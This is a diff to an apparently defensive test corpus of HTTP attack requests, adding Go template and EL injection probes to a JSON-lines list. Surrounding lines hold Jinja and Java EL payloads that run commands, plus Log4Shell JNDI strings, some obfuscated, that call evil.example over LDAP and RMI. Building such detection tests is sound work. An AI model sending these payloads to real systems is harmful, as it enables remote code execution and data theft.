@@ -74,6 +74,11 @@
 {"name":"jinja rce","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","{{''.__class__.__mro__[1].__subclasses__()}}"]],"headers":{},"content_type":"","body":""}
 {"name":"java el","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","${T(java.lang.Runtime).getRuntime().exec('id')}"]],"headers":{},"content_type":"","body":""}
 {"name":"go template","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","{{ .Env }}"]],"headers":{},"content_type":"","body":""}
+{"name":"go printf action","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","{{printf \"%v\" .}}"]],"headers":{},"content_type":"","body":""}
+{"name":"go call action","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","{{ call .Func }}"]],"headers":{},"content_type":"","body":""}
+{"name":"go define action","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","{{define \"x\"}}{{.}}{{end}}"]],"headers":{},"content_type":"","body":""}
+{"name":"el arithmetic","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","${7*7}"]],"headers":{},"content_type":"","body":""}
+{"name":"el member access","category":"ssti","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","${user.password}"]],"headers":{},"content_type":"","body":""}
 {"name":"jndi in user-agent","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"User-Agent":"${jndi:ldap://evil.example/a}"},"content_type":"","body":""}
 {"name":"obfuscated jndi","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products","query":[],"headers":{"X-Api-Version":"${${lower:j}ndi:${lower:l}dap://evil.example/a}"},"content_type":"","body":""}
 {"name":"jndi in query","category":"log4shell","kind":"attack","method":"GET","path":"/api/v1/products/search","query":[["q","${jndi:rmi://evil.example/x}"]],"headers":{},"content_type":"","body":""}
